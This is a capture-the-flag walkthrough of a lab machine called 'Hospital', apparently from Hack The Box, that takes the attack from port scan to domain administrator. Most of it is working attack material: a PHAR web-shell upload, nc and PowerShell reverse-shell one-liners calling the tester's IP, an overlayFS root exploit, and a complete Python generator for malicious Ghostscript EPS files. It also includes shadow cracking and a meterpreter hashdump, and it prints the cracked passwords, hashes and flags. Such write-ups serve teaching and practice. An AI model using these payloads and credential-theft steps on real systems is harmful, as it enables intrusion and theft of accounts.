## Recon

```
└─# rustscan --ulimit=5000 --range=1-65535 -a 10.10.11.241 -- -sV
Open 10.10.11.241:22
Open 10.10.11.241:53
Open 10.10.11.241:88
Open 10.10.11.241:135
Open 10.10.11.241:139
Open 10.10.11.241:389
Open 10.10.11.241:443
Open 10.10.11.241:445
Open 10.10.11.241:464
Open 10.10.11.241:593
Open 10.10.11.241:636
Open 10.10.11.241:5985
Open 10.10.11.241:6054
Open 10.10.11.241:6409
Open 10.10.11.241:6404
Open 10.10.11.241:6406
Open 10.10.11.241:6407
Open 10.10.11.241:6615
Open 10.10.11.241:6633
Open 10.10.11.241:8080
Open 10.10.11.241:9389
Scanned at 2023-11-18 23:20:11 GMT for 90s

PORT     STATE SERVICE       REASON          VERSION
22/tcp   open  ssh           syn-ack ttl 62  OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-11-19 06:20:22Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?      syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
6054/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
6404/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
6406/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
6409/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
6615/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
6633/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
8080/tcp open  http          syn-ack ttl 62  Apache httpd 2.4.55 ((Ubuntu))
9389/tcp open  mc-nmf        syn-ack ttl 127 .NET Message Framing
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows


└─# nmap -sC -Pn -p53,88,135,139,389,443,445,464,593,636,5985,6054,6404,6406,6407,6409,6615,6633,8080,9389 -sV --min-rate 5000 $ip
NSE Timing: About 99.93% done; ETC: 23:26 (0:00:00 remaining)
Nmap scan report for 10.10.11.241
Host is up (0.78s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-19 06:24:42Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http      Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6054/tcp open  msrpc         Microsoft Windows RPC
6404/tcp open  msrpc         Microsoft Windows RPC
6406/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc         Microsoft Windows RPC
6409/tcp open  msrpc         Microsoft Windows RPC
6615/tcp open  msrpc         Microsoft Windows RPC
6633/tcp open  msrpc         Microsoft Windows RPC
8080/tcp open  http          Apache httpd 2.4.55 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.55 (Ubuntu)
| http-title: Login
|_Requested resource was login.php
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-11-19T06:25:55
|_  start_date: N/A


```
found : `DNS:DC.hospital.htb`
On port 443, i found a webmail, so i will search for vhost.

```
└─# gobuster vhost -u https://hospital.htb -w /usr/share/wordlists/Seclists/subdomains-top5000.txt --append-domain -k
Nothing found

```
Now i will fuzz directory on the website or i will go on port `8080` Coz i found login.php and register.php
Now i will register easily. on website i found upload sessions. `In order to get more personalized treatment, please upload your medical record`
when i upload jpeg i have http://hospital.htb:8080/success.php
when i try to access to my file http://hospital.htb:8080/uploads/brand.png not work
also a .php not work. so now i will upload .phar
```
.php did not work but .ps1 and .phar does

access files via  /uploads/filename```
```
```
http://hospital.htb:8080/uploads/shell.phar
└─$ sudo rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.64] from (UNKNOWN) [10.10.11.241] 6590
                                                                                                                   
┌──(bloman㉿1337)-[~]

```
But the connexion is lefting me.
so now i will use this p0wny-shell
```

## Ressources
https://github.com/flozz/p0wny-shell
www-data@webserver:…/html/uploads# whoami
www-data


www-data@webserver:…/html/uploads# ls
87.phar
shell.phar
shell2.phar
videos2.phar
videos3.phar
```
## Shell on my Computer

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.64 1337 >/tmp/f

└─$ sudo rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.64] from (UNKNOWN) [10.10.11.241] 6600
bash: cannot set terminal process group (908): Inappropriate ioctl for device
bash: no job control in this shell
www-data@webserver:/var/www/html/uploads$ 

```

## Vertical Privilege Escalation
On home i found a user
```
drwilliams
```
I am in a container so here i need to get root but it's limited.

## get root in the limited shell/ container
```
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 23.04"
NAME="Ubuntu"
VERSION_ID="23.04"
VERSION="23.04 (Lunar Lobster)"
VERSION_CODENAME=lunar
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=lunar
LOGO=ubuntu-logo
```
This version is vulnerable to Ubuntu Local Privilege Escalation (CVE-2023-2640 & CVE-2023-32629) 
via overlayFs, ressources is here : https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/

```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;

setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash -i")' 

```

###
```
www-data@webserver:/tmp/priv.c$  unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
 unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
>  setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash -i")'
 setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash -i")'
root@webserver:/tmp/priv.c# id                                id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
root@webserver:/tmp/priv.c# whoami                            whoami
whoami
root
root@webserver:/tmp/priv.c# 
```

Now search for user.txt


```
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
daemon:*:19462:0:99999:7:::
bin:*:19462:0:99999:7:::
sys:*:19462:0:99999:7:::
sync:*:19462:0:99999:7:::
games:*:19462:0:99999:7:::
man:*:19462:0:99999:7:::
lp:*:19462:0:99999:7:::
mail:*:19462:0:99999:7:::
news:*:19462:0:99999:7:::
uucp:*:19462:0:99999:7:::
proxy:*:19462:0:99999:7:::
www-data:*:19462:0:99999:7:::
backup:*:19462:0:99999:7:::
list:*:19462:0:99999:7:::
irc:*:19462:0:99999:7:::
_apt:*:19462:0:99999:7:::
nobody:*:19462:0:99999:7:::
systemd-network:!*:19462::::::
systemd-timesync:!*:19462::::::
messagebus:!:19462::::::
systemd-resolve:!*:19462::::::
pollinate:!:19462::::::
sshd:!:19462::::::
syslog:!:19462::::::
uuidd:!:19462::::::
tcpdump:!:19462::::::
tss:!:19462::::::
landscape:!:19462::::::
fwupd-refresh:!:19462::::::
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
lxd:!:19612::::::
mysql:!:19620::::::
```
I will try to crack shadow and passwd
```
└─# unshadow passwd.txt shadow.txt > hash.txt


```
I will use hashcat.
```
└─# hashcat -m 1800 -a 0 shadow.txt passwd.txt                      
$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz...W192y/
Time.Started.....: Sun Nov 19 11:22:31 2023 (0 secs)
Time.Estimated...: Sun Nov 19 11:22:31 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwd.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      157 H/s (0.10ms) @ Accel:256 Loops:128 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1/1 (100.00%)
Rejected.........: 0/1 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Candidate.Engine.: Device Generator
Candidates.#1....: qwe123!@# -> qwe123!@#
Hardware.Mon.#1..: Temp: 88c Util: 33%

Started: Sun Nov 19 11:22:30 2023
Stopped: Sun Nov 19 11:22:33 2023


```
I will use this to try to connect on `hospital` portal because on home we found `drwilliams`.
Yeah connected successfuly.

## SHell on the mail
On the mail i found
```
Dear Lucy,

I wanted to remind you that the project for lighter, cheaper and
environmentally friendly needles is still ongoing 💉. You are the one in
charge of providing me with the designs for these so that I can take
them to the 3D printing department and start producing them right away.
Please make the design in an ".eps" file format so that it can be well
visualized with GhostScript.

Best regards,
Chris Brown.

```
with some research i found : CVE-2023-36664-Ghostscript-command-injection 
https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
https://www.vicarius.io/vsociety/posts/cve-2023-36664-command-injection-with-ghostscript-poc-exploit
I will try this :
```
└─# python3 CVE_2023_36664_exploit.py --generate --revshell -ip 10.10.16.64 -port 1337 --filename bloman --extension eps
[+] Generated EPS payload file: bloman.eps
```
Now what i will do is to reply to that mail from `drbrown@hospital.htb` with my `.eps`
Not work beacause i am trying to get shell on a windows, not a Linux.
I will use revshells. 
```

powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('10.10.16.64', 1337);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
```

These not work
```
import argparse
import os
import re
import subprocess
import base64

def get_user_input():
    ip_command = "ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1"
    ip = subprocess.check_output(ip_command, shell=True).decode().strip()
    print(f"Detected Tun0 IP: {ip}")
    user_ip = input("Enter to accept IP or type new IP: ")
    ip = user_ip if user_ip else ip
    port = input("Enter NetCat connect back port: ")
    filename = input("Enter filename: ")

    return ip, port, filename

def generate_payload(ip, port):
    payload = f"""$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(( $i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()}};
$client.Close()"""

    base64_payload = base64.b64encode(payload.encode('utf-16le')).decode()
    final_payload = f"powershell -e {base64_payload}"
    escaped_payload = f"(%pipe%{final_payload}) (w) file /DCTDecode filter"
    return escaped_payload

def generate_payload_file(filename, payload):
    content = f"""%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 300 300
%%Title: Malicious EPS

/Times-Roman findfont
24 scalefont
setfont

newpath
50 200 moveto
(Sup breachforums!) show

newpath
30 100 moveto
60 230 lineto
90 100 lineto
stroke
{payload}
showpage"""

    filename = filename + '.eps'
    with open(filename, 'w') as file:
        file.write(content)

def main():
    ip, port, filename = get_user_input()
    payload = generate_payload(ip, port)
    generate_payload_file(filename, payload)
    print(f"\n[+] Generated malicious .eps file: {filename}.eps")
    print(f"[+] Popping your courtesy netcat shell: {ip} -lvnp {port}")
    print(f"[+] Log into RoundCubeMail and reply to Dr Brown's email, \n    attach {filename}.eps and send. Rev Shell takes a few seconds :)")
    command = f'qterminal -e "bash -c \'nc -lvnp {port}; exec bash\'"'
    subprocess.Popen(command, shell=True)

if __name__ == "__main__":
    main()                                                                                                                      

```
So i used this script to generate a .eps file 
```
└─$ sudo rlwrap nc -lvnp 1337
[sudo] password for bloman: 
listening on [any] 1337 ...
connect to [10.10.16.64] from (UNKNOWN) [10.10.11.241] 6286
id
PS C:\Users\drbrown.HOSPITAL\Documents> 
PS C:\Users\drbrown.HOSPITAL\Documents> dir


    Directory: C:\Users\drbrown.HOSPITAL\Documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       10/23/2023   3:33 PM            373 ghostscript.bat                                                       
-a----       11/19/2023   9:15 AM          43696 nc.exe                                                                
-a----       11/19/2023   9:21 AM          38616 nc.exe&&nc.exe                                                        
-a----       11/19/2023   9:00 AM          43696 nc64.exe&&nc64.exe                                                    


PS C:\Users\drbrown.HOSPITAL\Documents> 
PS C:\Users\drbrown.HOSPITAL\Documents> whoami
hospital\drbrown
```
In this directory i found a `ghostscript.bat`
```
PS C:\Users\drbrown.HOSPITAL\Documents> type ghostscript.bat
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
PS C:\Users\drbrown.HOSPITAL\Documents> 

```
Found user and passwd
```
PS C:\users\drbrown.HOSPITAL\Desktop> type user.txt
9638bbe892252245fab365dcad5045ce
PS C:\users\drbrown.HOSPITAL\Desktop> 
```



## Privilege Escalation
I will go and try to connect on RDP using that and with the drbrown user
```
xfreerdp /u:drbrown /v:10.10.11.241
chr!$br0wn
```
We will find the folder with scripts `C:\Users\drbrown.HOSPITAL\Documents\scripts`, which is no longer there (`the ssh_root.vbs` file should have been there).
after running this and i open a notepad
The script writed the password and admin
`AdministratorTh3B3stH0sp1t4l9786!`
In our nmap scan the port 445 was open. now i will just on that port using smb
```
└─# impacket-smbexec administrator@10.10.11.241
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>


```


```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.64:1333 
[*] Sending stage (200774 bytes) to 10.10.11.241
[*] Meterpreter session 1 opened (10.10.16.64:1333 -> 10.10.11.241:6763) at 2023-11-19 12:51:03 +0000

meterpreter > 

meterpreter > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1a0158142556cfc5aa9fdb974e0352f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:26fb7ca2f4a67b2d8d81ffcfeeeffd13:::
$431000-R1KSAI1DGHMH:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_0559ce7ac4be4fc6a:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_bb030ff39b6c4a2db:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_9326b57ae8ea44309:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_b1b9e7f83082488ea:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_e5b6f3aed4da4ac98:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_75554ef7137f41d68:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_6e9de17029164abdb:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_5faa2be1160c4ead8:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SM_2fe3f3cbbafa4566a:1133:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
drbrown:1601:aad3b435b51404eeaad3b435b51404ee:33a3edc8fc4cf06cb3b836c541a7b997:::
drwilliams:1602:aad3b435b51404eeaad3b435b51404ee:c377ba8a4dd52401bc404dbe49771bbc:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:e5ab307522689fdeb58c50aec017c1a4:::
meterpreter > 
C:\Users\Administrator\Desktop>type root.txt
type root.txt
a57b0bebcc53ac358599204d1f77a250

C:\Users\Administrator\Desktop>



```